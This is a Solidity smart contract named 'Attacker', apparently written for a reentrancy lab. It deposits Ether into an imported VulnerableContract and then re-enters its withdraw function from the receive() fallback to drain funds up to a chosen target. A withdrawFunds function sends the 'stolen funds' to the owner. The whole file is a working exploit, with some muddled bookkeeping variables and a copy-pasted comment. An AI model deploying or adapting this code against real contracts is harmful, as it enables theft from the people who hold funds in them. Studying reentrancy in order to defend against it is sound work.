// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attacker {
    VulnerableContract public vulnerable;
    address public owner;
    uint256 public targetAmount;  // Amount to drain
    uint256 public drainedAmount;  // Amount already drained
    uint256 public prevBalanceVulnerableContract;  // Amount to drain
    uint256 public totalWithdraw = drainedAmount; //targetAmount - drainedAmount;

    constructor(address payable _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
        owner = msg.sender;
    }

    // Fallback function for reentrancy
    receive() external payable {
        uint256 vulnBalance = address(vulnerable).balance;
        
       // uint256 attackBalance = address(this).balance;
        if (totalWithdraw < targetAmount && prevBalanceVulnerableContract >= vulnBalance) {
            
            
            if (totalWithdraw > vulnBalance) {
                totalWithdraw = vulnBalance;  // Cap withdrawal to remaining balance
            }
            //drainedAmount += amountToWithdraw;
            totalWithdraw += drainedAmount;
            prevBalanceVulnerableContract -= drainedAmount;
            if (drainedAmount>0) {
                vulnerable.withdraw(drainedAmount);
              }  // Reenter to withdraw
            
        }
    }

    // Initiate the attack with a specific target amount
    function attack(uint256 _targetAmount) external payable {
        require(msg.value > 0, "Need to send some Ether to attack");
        require(_targetAmount > 0, "Target amount must be greater than 0");
        targetAmount = _targetAmount;
        drainedAmount = msg.value;
        

        // Deposit initial amount to vulnerable contract
        vulnerable.deposit{value: msg.value}();

        prevBalanceVulnerableContract = address(vulnerable).balance;

        // Start reentrancy attack with the initial deposit
        vulnerable.withdraw(msg.value);  // Start by withdrawing the initial deposit
    }

    // Withdraw stolen funds
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

     // Function to allow the contract to receive Ether
    function deposit() external payable {
        // Function to handle incoming Ether
    }
   
}
